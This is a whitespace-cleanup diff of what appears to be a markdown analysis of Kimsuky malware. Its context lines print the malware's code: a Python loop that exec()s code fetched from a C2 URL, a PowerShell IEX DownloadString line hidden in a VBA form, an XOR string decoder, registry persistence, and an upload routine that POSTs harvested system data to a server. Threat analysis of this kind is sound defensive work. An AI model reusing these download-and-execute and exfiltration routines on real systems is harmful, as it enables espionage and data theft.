@@ -91,7 +91,7 @@ import time
 import urllib2
 import threading
 from httplib import *
-   
+
 def ExecNewCmd():
  exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=new')).read())
 
@@ -100,7 +100,7 @@ def SpyLoop():
   CollectData()
   ExecNewCmd()
   time.sleep(300)
-``` 
+```
 
 <h6>The Collectdata function queries for getting the system informations, files on the differents repertories, pack it on a password ZIP and send it to the C2.</h6>
 
@@ -203,11 +203,11 @@ End Sub
 ```vb
 -------------------------------------------------------------------------------
 VBA FORM Variable "TextBox1" IN '.\\vbaProject.bin' - OLE stream: u'tptkddlsjangkspdy'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 IEX (New-Object System.Net.WebClient).DownloadString('http://mybobo.mygamesonline.org/flower01/flower01.ps1')
 -------------------------------------------------------------------------------
 VBA FORM Variable "TextBox2" IN '.\\vbaProject.bin' - OLE stream: u'tptkddlsjangkspdy'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 C:\windows\temp\bobo.txt
 ```
 
@@ -266,15 +266,15 @@ function Get_info($logpath)
  tasklist >> $logpath
 }
 function decode($encstr)
-{ 
- $key = [byte[]](0,2,4,3,3,6,4,5,7,6,7,0,5,5,4,3,5,4,3,7,0,7,6,2,6,2,4,6,7,2,4,7,5,5,7,0,7,3,3,3,7,3,3,1,4,2,3,7,0,2,7,7,3,5,1,0,1,4,0,5,0,0,0,0,7,5,1,4,5,4,2,0,6,1,4,7,5,0,1,0,3,0,3,1,3,5,1,2,5,0,1,7,1,4,6,0,2,3,3,4,2,5,2,5,4,5,7,3,1,0,1,6,4,1,1,2,1,4,1,5,4,2,7,4,5,1,6,4,6,3,6,4,5,0,3,6,4,0,1,6,3,3,5,7,0,5,7,7,2,5,2,7,7,4,7,5,5,0,5,6) 
+{
+ $key = [byte[]](0,2,4,3,3,6,4,5,7,6,7,0,5,5,4,3,5,4,3,7,0,7,6,2,6,2,4,6,7,2,4,7,5,5,7,0,7,3,3,3,7,3,3,1,4,2,3,7,0,2,7,7,3,5,1,0,1,4,0,5,0,0,0,0,7,5,1,4,5,4,2,0,6,1,4,7,5,0,1,0,3,0,3,1,3,5,1,2,5,0,1,7,1,4,6,0,2,3,3,4,2,5,2,5,4,5,7,3,1,0,1,6,4,1,1,2,1,4,1,5,4,2,7,4,5,1,6,4,6,3,6,4,5,0,3,6,4,0,1,6,3,3,5,7,0,5,7,7,2,5,2,7,7,4,7,5,5,0,5,6)
  $len = $encstr.Length
  $j = 0
  $i = 0
  $comletter = ""
  while($i -lt $len)
  {
-  $j = $j % 160  
+  $j = $j % 160
   $asciidec = $encstr[$i] -bxor $key[$j]
   $dec = [char]$asciidec
   $comletter += $dec
@@ -364,7 +364,7 @@ function UpLoadFunc($logpath)
   ) -join $LF
 
   Start-Sleep -Milliseconds 1
-  $psVersion = $PSVersionTable.PSVersion  
+  $psVersion = $PSVersionTable.PSVersion
   $r = [System.Net.WebRequest]::Create($Url)
   $r.Method = "POST"
   $r.UseDefaultCredentials = $true
@@ -375,7 +375,7 @@ function UpLoadFunc($logpath)
   $newStream = $r.GetRequestStream()
   $newStream.Write($data1, 0, $data1.Length)
   $newStream.Close();
-  
+
   if($php_post -like "ok"){echo "UpLoad Success!!!"}
   else
   {
@@ -403,7 +403,7 @@ function main
   $value1 = New-ItemProperty -Path $RegKey -Name $RegValueName -Value $regValue
   Get_info $szLogPath
  }
- 
+
  while ($true)
  {
   FileUploading $szLogPath
@@ -415,7 +415,7 @@ function main
 }
 main
 ```
-   
+
 <h2>Threat Intelligence</h2><a name="Intel"></a></h2>
 
 ### Similarities between the different versions of kimsuky
@@ -522,9 +522,9 @@ main
 <h2>Links <a name="Links"></a></h2>
 <h6> Original tweets: </h6><a name="tweet"></a>
 
-* [https://twitter.com/Timele9527/status/1240620534468997125](https://twitter.com/Timele9527/status/1240620534468997125) 
-* [https://twitter.com/Timele9527/status/1240123132419223554](https://twitter.com/Timele9527/status/1240123132419223554) 
-* [https://twitter.com/cyberwar_15/status/1240779000256942080](https://twitter.com/cyberwar_15/status/1240779000256942080) 
+* [https://twitter.com/Timele9527/status/1240620534468997125](https://twitter.com/Timele9527/status/1240620534468997125)
+* [https://twitter.com/Timele9527/status/1240123132419223554](https://twitter.com/Timele9527/status/1240123132419223554)
+* [https://twitter.com/cyberwar_15/status/1240779000256942080](https://twitter.com/cyberwar_15/status/1240779000256942080)
 
 <h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>
 
